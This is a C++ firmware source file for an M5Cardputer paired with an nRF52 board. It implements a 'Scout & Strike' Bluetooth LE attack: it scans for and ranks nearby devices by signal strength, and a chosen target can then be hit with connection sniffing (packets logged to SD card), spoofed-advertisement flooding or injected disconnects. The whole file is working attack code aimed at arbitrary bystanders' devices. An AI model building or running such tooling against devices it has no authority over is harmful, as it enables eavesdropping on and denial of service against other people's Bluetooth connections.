/*
 * nrf52_scout_strike.cpp — Scout & Strike dual-radio BLE attack.
 *
 * Phase 1 (SCOUT): ESP32 NimBLE smart scan — names, services, RSSI.
 * Phase 2 (STRIKE): nRF52 raw sniff / flood / disconnect on target.
 */
#include "../app.h"
#include "../ui.h"
#include "../input.h"
#include "../theme.h"
#include "../sfx.h"
#include "../radio.h"
#include "../nrf52_hw.h"
#include "../nrf52_led.h"
#include "../sd_helper.h"
#include <Arduino.h>
#include <NimBLEDevice.h>

struct scout_target_t {
    uint8_t addr[6]; char name[24]; int8_t rssi;
    bool is_public; char type_hint[16];
};

#define SCOUT_MAX 32
static scout_target_t s_targets[SCOUT_MAX];
static int s_tcount = 0;
static int s_selected = -1;

/* ---- helpers ---- */
static bool ensure_feather(void)
{
    if (NRF52Hardware::is_up()) return true;
    ui_clear_body();
    ui_draw_status("Scout", "");
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+10);
    d.print("Connecting to Feather...");
    if (NRF52Hardware::begin()) { ui_toast("nRF52 connected!", T_GOOD, 800); return true; }
    d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+24);
    d.print("Feather not found.");
    d.setTextColor(T_DIM, T_BG); d.setCursor(4, BODY_Y+38);
    d.print("G3=TX G4=RX 3V3 GND");
    ui_draw_footer("ESC=back");
    while (true) { uint16_t k = input_poll(); if (k != PK_NONE) return false; delay(40); }
}

static void sanitize(const char *in, char *out, size_t sz) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j+1 < sz; ++i) {
        uint8_t c = (uint8_t)in[i]; if (c >= 0x20 && c < 0x7F) out[j++] = (char)c;
    }
    out[j] = '\0';
}

static void classify_quick(const NimBLEAdvertisedDevice *dev, char *out, size_t sz) {
    if (dev->haveManufacturerData()) {
        std::string md = dev->getManufacturerData();
        if (md.size() >= 2) {
            uint16_t cid = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
            if (cid == 0x004C) { snprintf(out, sz, "Apple");   return; }
            if (cid == 0x0075) { snprintf(out, sz, "Samsung"); return; }
            if (cid == 0x0006) { snprintf(out, sz, "MSFT");    return; }
            if (cid == 0x00E0) { snprintf(out, sz, "Google");  return; }
        }
    }
    snprintf(out, sz, "BLE");
}

/* ---- NimBLE scan ---- */
static void do_nimble_scan(void) {
    s_tcount = 0;
    if (NimBLEDevice::isInitialized()) NimBLEDevice::deinit(true);
    delay(500);
    if (!NimBLEDevice::init("")) return;
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEScan *pScan = NimBLEDevice::getScan();
    pScan->setInterval(97); pScan->setWindow(67);
    pScan->setDuplicateFilter(false);

    auto ingest = [](NimBLEScanResults &results) {
        for (int i = 0; i < (int)results.getCount() && s_tcount < SCOUT_MAX; ++i) {
            const NimBLEAdvertisedDevice *dev = results.getDevice(i);
            if (!dev) continue;
            NimBLEAddress addr = dev->getAddress();
            bool dup = false;
            for (int j = 0; j < s_tcount; ++j)
                if (memcmp(s_targets[j].addr, addr.getBase()->val, 6) == 0) { dup = true; break; }
            if (dup) continue;
            scout_target_t &t = s_targets[s_tcount++];
            memcpy(t.addr, addr.getBase()->val, 6);
            t.rssi = dev->getRSSI();
            t.is_public = (addr.getType() == BLE_ADDR_PUBLIC);
            t.name[0] = '\0';
            if (dev->haveName()) sanitize(dev->getName().c_str(), t.name, sizeof(t.name));
            classify_quick(dev, t.type_hint, sizeof(t.type_hint));
        }
    };

    pScan->setMaxResults(200);   /* POS-AUDIT-011: bound the ad vector (OOM reboot on dense scans). */
    pScan->setActiveScan(true);
    NimBLEScanResults ar = pScan->getResults(6000, false);
    ingest(ar); pScan->clearResults();
    pScan->setActiveScan(false);
    NimBLEScanResults pr = pScan->getResults(4000, false);
    ingest(pr); pScan->clearResults();

    /* Sort by RSSI descending */
    for (int i = 0; i < s_tcount - 1; ++i)
        for (int j = i + 1; j < s_tcount; ++j)
            if (s_targets[j].rssi > s_targets[i].rssi) {
                scout_target_t tmp = s_targets[i]; s_targets[i] = s_targets[j]; s_targets[j] = tmp;
            }
}

/* ---- SCOUT: scan + select ---- */
static void scout_phase(void) {
    radio_switch(RADIO_BLE);
    nrf52_led_set(NRF52_LED_BLE_SCAN);
    ui_clear_body(); ui_draw_status("Scout", "scanning");
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+2);
    d.print("SCOUT: NimBLE scan..."); d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_ACCENT2);
    do_nimble_scan();

    int cursor = 0;
    const int rows = 8, row_h = 12, fy = BODY_Y + 16;
    ui_draw_footer("ENTER=lock ;/.=scroll R=rescan ESC=back");
    /* Draw chrome (HR divider) once. Count line uses fixed-width
     * self-overwrite each iteration so rescan updates cleanly without
     * a body wipe. Only the list-row region gets cleared per cursor move. */
    ui_clear_body();
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_ACCENT2);
    bool dirty = true;
    while (true) {
        if (dirty) {
            d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+2);
            d.printf("SCOUT: %-4d targets", s_tcount);
            /* Clear list region only. */
            d.fillRect(0, fy, SCR_W, rows * row_h, T_BG);
            int top = max(0, cursor - rows/2);
            if (top + rows > s_tcount) top = max(0, s_tcount - rows);
            for (int r = 0; r < rows && top+r < s_tcount; ++r) {
                int i = top + r, y = fy + r * row_h;
                bool sel = (i == cursor);
                uint16_t bg = sel ? T_SEL_BG : T_BG;
                if (sel) d.fillRoundRect(2, y-1, SCR_W-4, row_h-1, 2, T_SEL_BG);
                d.setTextColor(T_DIM, bg); d.setCursor(4, y+1); d.printf("%4d", s_targets[i].rssi);
                d.setTextColor(T_WARN, bg); d.setCursor(32, y+1); d.printf("%-7s", s_targets[i].type_hint);
                d.setTextColor(sel ? T_ACCENT : T_FG, bg); d.setCursor(78, y+1);
                if (s_targets[i].name[0]) d.printf("%.20s", s_targets[i].name);
                else d.printf("%02X:%02X:%02X:%02X", s_targets[i].addr[2], s_targets[i].addr[3],
                              s_targets[i].addr[4], s_targets[i].addr[5]);
            }
            dirty = false;
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { s_selected = -1; return; }
        if (k == ';' || k == PK_UP)   { int nc = max(0, cursor-1); if (nc != cursor) { cursor = nc; dirty = true; } }
        else if (k == '.' || k == PK_DOWN) { int nc = min(s_tcount-1, cursor+1); if (nc != cursor) { cursor = nc; dirty = true; } }
        else if (k == 'r' || k == 'R')     { do_nimble_scan(); cursor = 0; dirty = true; }
        else if (k == PK_ENTER)            { s_selected = cursor; sfx_select(); return; }
    }
}

/* ---- STRIKE: nRF52 raw attack on locked target ---- */
static void strike_phase(void) {
    if (s_selected < 0) return;
    const scout_target_t &tgt = s_targets[s_selected];
    nrf52_led_set(NRF52_LED_SCOUT_LOCKED);
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+2); d.print("TARGET LOCKED");
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_BAD);
    d.setTextColor(T_FG, T_BG); d.setCursor(4, BODY_Y+16);
    d.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X", tgt.addr[0], tgt.addr[1],
             tgt.addr[2], tgt.addr[3], tgt.addr[4], tgt.addr[5]);
    d.setCursor(4, BODY_Y+28); d.printf("NAME: %s", tgt.name[0] ? tgt.name : "(none)");
    d.setCursor(4, BODY_Y+40); d.printf("TYPE: %s  RSSI: %d", tgt.type_hint, tgt.rssi);
    d.setTextColor(T_ACCENT2, T_BG);
    d.setCursor(4, BODY_Y+56); d.print("S = Sniff Connection");
    d.setCursor(4, BODY_Y+68); d.print("F = Flood Spoof ADV");
    d.setCursor(4, BODY_Y+80); d.print("D = Disconnect Inject");
    ui_draw_status("Strike", "ready");
    ui_draw_footer("S=sniff F=flood D=disco ESC=back");

    while (true) {
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) return;
        char mac_str[20];
        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 tgt.addr[0], tgt.addr[1], tgt.addr[2], tgt.addr[3], tgt.addr[4], tgt.addr[5]);
        String resp;

        if (k == 's' || k == 'S') {
            nrf52_led_set(NRF52_LED_SCOUT_STRIKE); sfx_scan_start();
            char cmd[64]; snprintf(cmd, sizeof(cmd), "BLE_FOLLOW %s", mac_str);
            NRF52Hardware::send_command(cmd, resp, 1000);
            ui_clear_body(); ui_draw_status("Strike", "sniffing");
            ui_draw_footer("ESC=stop S=save");
            d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+2); d.print("STRIKE: Conn Sniff");
            d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_BAD);
            File pf = sdlog_open("scout_strike", "ts,data");
            uint32_t pkt = 0, ld = 0;
            while (true) {
                while (NRF52Hardware::available()) {
                    String line = NRF52Hardware::read_line();
                    if (line.startsWith("PKT:") || line.startsWith("CONN:")) {
                        pkt++;
                        if (pf) pf.printf("%lu,%s\n", (unsigned long)millis(), line.c_str());
                        if (millis() - ld > 150) {
                            ld = millis();
                            d.fillRect(0, BODY_Y+16, SCR_W, 40, T_BG);
                            d.setTextColor(T_GOOD, T_BG); d.setCursor(4, BODY_Y+18);
                            d.printf("Pkts: %lu", (unsigned long)pkt);
                            d.setTextColor(T_DIM, T_BG); d.setCursor(4, BODY_Y+32);
                            d.print(line.substring(0, min((int)line.length(), 36)));
                            ui_hexstream(4, BODY_Y+48, SCR_W-8, 12, T_ACCENT);
                        }
                        if (line.startsWith("CONN:"))
                            nrf52_led_oneshot(NRF52_LED_CAPTURE, NRF52_LED_SCOUT_STRIKE, 1500);
                    }
                }
                uint16_t k2 = input_poll();
                if (k2 == PK_ESC) break;
                if ((k2 == 's' || k2 == 'S') && pf) { pf.flush(); ui_toast("Saved", T_GOOD, 600); }
                delay(10);
            }
            NRF52Hardware::send_command("STOP", resp, 500);
            if (pf) pf.close();
            return;
        }
        if (k == 'f' || k == 'F') {
            nrf52_led_set(NRF52_LED_FLOOD); sfx_glitch();
            char cmd[64]; snprintf(cmd, sizeof(cmd), "BLE_FLOOD %s", mac_str);
            NRF52Hardware::send_command(cmd, resp, 1000);
            ui_clear_body(); ui_draw_status("Strike", "flooding");
            ui_draw_footer("ESC=stop");
            d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+2); d.print("STRIKE: ADV Flood");
            uint32_t fc = 0, last_fc = (uint32_t)-1, fdraw = 0;
            while (true) {
                while (NRF52Hardware::available()) { NRF52Hardware::read_line(); fc++; }
                if (millis() - fdraw > 150) {
                    fdraw = millis();
                    if (fc != last_fc) {
                        last_fc = fc;
                        ui_text_w(4, BODY_Y+18, SCR_W-8, T_ACCENT, "Spoofed: %lu", (unsigned long)fc);
                    }
                    ui_glitch(4, BODY_Y+40, SCR_W-8, 40);
                }
                if (input_poll() == PK_ESC) break;
                delay(30);
            }
            NRF52Hardware::send_command("STOP", resp, 500);
            return;
        }
        if (k == 'd' || k == 'D') {
            nrf52_led_set(NRF52_LED_DEAUTH); sfx_deauth_burst();
            char cmd[64]; snprintf(cmd, sizeof(cmd), "BLE_DISCONNECT %s", mac_str);
            NRF52Hardware::send_command(cmd, resp, 1000);
            ui_clear_body(); ui_draw_status("Strike", "disco");
            d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+10);
            d.print(">> BLE DISCONNECT <<");
            uint32_t sent = 0;
            while (true) {
                while (NRF52Hardware::available()) { NRF52Hardware::read_line(); sent++; }
                ui_dashboard_chrome("BLE DISCO", (sent % 8 == 0));
                d.fillRect(0, BODY_Y+16, SCR_W, 20, T_BG);
                d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+18);
                d.printf("LL_TERMINATE: %lu", (unsigned long)sent);
                if (input_poll() == PK_ESC) break;
                delay(50);
            }
            NRF52Hardware::send_command("STOP", resp, 500);
            return;
        }
    }
}

/* ---- entry ---- */
void feat_nrf52_scout_strike(void) {
    if (!ensure_feather()) return;
    sfx_scan_start();
    scout_phase();
    if (s_selected < 0) { nrf52_led_set(NRF52_LED_IDLE); return; }
    NimBLEScan *scan = NimBLEDevice::getScan(); if (scan) scan->stop();
    NimBLEDevice::deinit(true); delay(200);
    strike_phase();
    nrf52_led_set(NRF52_LED_IDLE);
}
